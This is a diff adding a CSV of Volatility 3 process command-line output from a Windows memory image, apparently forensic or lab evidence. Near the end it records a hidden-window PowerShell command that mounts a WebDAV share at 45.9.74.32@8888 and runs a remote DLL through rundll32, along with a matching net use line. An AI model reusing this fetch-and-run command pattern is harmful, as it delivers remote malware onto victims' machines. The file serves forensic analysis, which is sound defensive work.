@@ -1,0 +1,113 @@
+Volatility 3 Framework 2.8.0,,
+,,
+PID,Process,Args
+,,
+4,System,Required memory at 0x20 is inaccessible (swapped)
+92,Registry,Required memory at 0x20 is not valid (process exited?)
+300,smss.exe,Process 300: Required memory at 0x8141d08000 is not valid (incomplete layer memory_layer?)
+416,csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
+492,wininit.exe,Required memory at 0x8dd111f020 is inaccessible (swapped)
+512,csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
+588,winlogon.exe,winlogon.exe
+628,services.exe,C:\Windows\system32\services.exe
+636,lsass.exe,C:\Windows\system32\lsass.exe
+748,fontdrvhost.ex,Required memory at 0x1ef2831020 is not valid (process exited?)
+752,fontdrvhost.ex,Required memory at 0x22512c41a28 is inaccessible (swapped)
+764,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
+872,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS -p
+956,dwm.exe,dwm.exe
+440,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p
+420,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
+656,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+1040,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+1112,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p
+1260,svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService -p
+1452,MemCompression,Required memory at 0x20 is not valid (process exited?)
+1520,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+1680,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel -p
+1688,svchost.exe,Required memory at 0xb59a32b020 is inaccessible (swapped)
+1696,svchost.exe,Required memory at 0x71e9c1e020 is inaccessible (swapped)
+1864,spoolsv.exe,C:\Windows\System32\spoolsv.exe
+1944,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+1952,svchost.exe,Required memory at 0xad7a360020 is inaccessible (swapped)
+2080,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc -p
+2216,wlms.exe,Process 2216: Required memory at 0x184900b10000 is not valid (incomplete layer memory_layer?)
+2232,vm3dservice.ex,Required memory at 0x152614c1ae8 is inaccessible (swapped)
+2248,vmtoolsd.exe,Required memory at 0x18f2c40211c is inaccessible (swapped)
+2256,VGAuthService.,Process 2256: Required memory at 0x14848c80000 is not valid (incomplete layer memory_layer?)
+2272,MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe
+2388,vm3dservice.ex,Required memory at 0x1e874be1ae8 is inaccessible (swapped)
+2736,dllhost.exe,Required memory at 0xaf422cd020 is inaccessible (swapped)
+2828,WmiPrvSE.exe,Required memory at 0x1f77fba2104 is inaccessible (swapped)
+2856,msdtc.exe,Process 2856: Required memory at 0x8104a8b4000 is not valid (incomplete layer memory_layer?)
+2956,svchost.exe,Required memory at 0xdb21702020 is inaccessible (swapped)
+3216,sihost.exe,sihost.exe
+3252,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+3316,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+3504,ctfmon.exe,ctfmon.exe
+3616,userinit.exe,Required memory at 0xca66d46020 is not valid (process exited?)
+3656,explorer.exe,C:\Windows\Explorer.EXE
+3148,svchost.exe,C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
+4356,StartMenuExper,C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
+4500,RuntimeBroker.,Required memory at 0xa02e95020 is inaccessible (swapped)
+4696,SearchApp.exe,
+4796,RuntimeBroker.,C:\Windows\System32\RuntimeBroker.exe -Embedding
+5180,RuntimeBroker.,Required memory at 0x20582803378 is inaccessible (swapped)
+5488,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+5540,msedge.exe,Required memory at 0xdb132ba020 is inaccessible (swapped)
+5760,svchost.exe,Required memory at 0x70eb844020 is inaccessible (swapped)
+5768,msedge.exe,Required memory at 0x19ac9a04000 is inaccessible (swapped)
+5780,msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --field-trial-handle=1928,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=2684 /prefetch:3"
+5792,msedge.exe,Required memory at 0x22837c039b8 is inaccessible (swapped)
+5848,SecurityHealth,C:\Windows\System32\SecurityHealthSystray.exe
+6268,SecurityHealth,C:\Windows\system32\SecurityHealthService.exe
+6368,vmtoolsd.exe,C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+6604,TextInputHost.,C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe -ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca
+7540,msedge.exe,Required memory at 0x6aac0cc020 is inaccessible (swapped)
+7176,SkypeApp.exe,Required memory at 0xbc52ca8020 is inaccessible (swapped)
+5088,msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=utility --utility-sub-type=edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang=en-US --service-sandbox-type=search_indexer --message-loop-type-ui --field-trial-handle=7556,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=7548 /prefetch:8"
+7848,RuntimeBroker.,Required memory at 0x7fff036020 is inaccessible (swapped)
+7792,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p
+7336,RuntimeBroker.,Required memory at 0x2b16af4020 is inaccessible (swapped)
+6780,WWAHost.exe,Required memory at 0x62df818020 is inaccessible (swapped)
+6700,ApplicationFra,C:\Windows\system32\ApplicationFrameHost.exe -Embedding
+6016,svchost.exe,Required memory at 0x2b36ba03388 is inaccessible (swapped)
+6212,dllhost.exe,Required memory at 0xbd69c3e020 is inaccessible (swapped)
+7692,SgrmBroker.exe,Required memory at 0x1c5a4cd10e8 is inaccessible (swapped)
+6760,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+4296,ShellExperienc,Required memory at 0x4ee0719020 is inaccessible (swapped)
+4780,RuntimeBroker.,Required memory at 0xfa9c0d7020 is inaccessible (swapped)
+1200,msedge.exe,Required memory at 0xe897ce3020 is inaccessible (swapped)
+1728,MicrosoftEdgeU,Required memory at 0x991b38 is inaccessible (swapped)
+5364,thunderbird.ex,C:\Program Files\Mozilla Thunderbird\thunderbird.exe
+4492,thunderbird.ex,Required memory at 0x2e2c3b3020 is inaccessible (swapped)
+8600,thunderbird.ex,Required memory at 0x6891198020 is inaccessible (swapped)
+8332,thunderbird.ex,Required memory at 0x787e200020 is inaccessible (swapped)
+7160,SearchApp.exe,Required memory at 0xc6a0185020 is inaccessible (swapped)
+7460,OfficeClickToR,Required memory at 0x167c8972156 is inaccessible (swapped)
+8280,SkypeBackgroun,Required memory at 0x3cd1d6020 is inaccessible (swapped)
+8544,dllhost.exe,Required memory at 0xa6bbb17020 is inaccessible (swapped)
+8720,notepad.exe,C:\Windows\system32\notepad.exe
+3644,thunderbird.ex,Required memory at 0xd8b9e2a020 is inaccessible (swapped)
+3004,thunderbird.ex,Required memory at 0x9364c2020 is inaccessible (swapped)
+6568,Calculator.exe,Required memory at 0x7bf0845020 is inaccessible (swapped)
+1400,RuntimeBroker.,Required memory at 0x986593c020 is inaccessible (swapped)
+1608,taskhostw.exe,taskhostw.exe
+9340,svchost.exe,C:\Windows\system32\svchost.exe -k WbioSvcGroup
+10108,AppVShNotify.e,Required memory at 0x1b2d39f1b08 is inaccessible (swapped)
+9296,SearchIndexer.,C:\Windows\system32\SearchIndexer.exe /Embedding
+4164,SearchProtocol,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1""
+4464,msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=renderer --disable-gpu-compositing --lang=en-US --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=145 --time-ticks-at-unix-epoch=-1720089883345586 --launch-time-ticks=1128944393 --field-trial-handle=10996,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=9344 /prefetch:1"
+10136,msedge.exe,Required memory at 0xd833767020 is inaccessible (swapped)
+1880,msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=renderer --disable-gpu-compositing --lang=en-US --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=153 --time-ticks-at-unix-epoch=-1720089883345586 --launch-time-ticks=1222488836 --field-trial-handle=10948,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=7820 /prefetch:1"
+7428,audiodg.exe,C:\Windows\system32\AUDIODG.EXE 0x4f0
+1920,msedge.exe,Required memory at 0x2353d002cd8 is inaccessible (swapped)
+6388,SearchProtocol,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""
+6404,msedge.exe,Required memory at 0x9608fea020 is inaccessible (swapped)
+8864,SearchFilterHo,C:\Windows\system32\SearchFilterHost.exe 0 804 808 816 8192 812 788
+2820,smartscreen.ex,C:\Windows\System32\smartscreen.exe -Embedding
+9112,wordpad.exe,C:\Program Files\Windows NT\Accessories\wordpad.exe
+3692,powershell.exe,"powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry"
+6892,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4
+2416,net.exe,C:\Windows\system32\net.exe use \\45.9.74.32@8888\davwwwroot\
+832,svchost.exe,C:\Windows\system32\svchost.exe -k PrintWorkflow
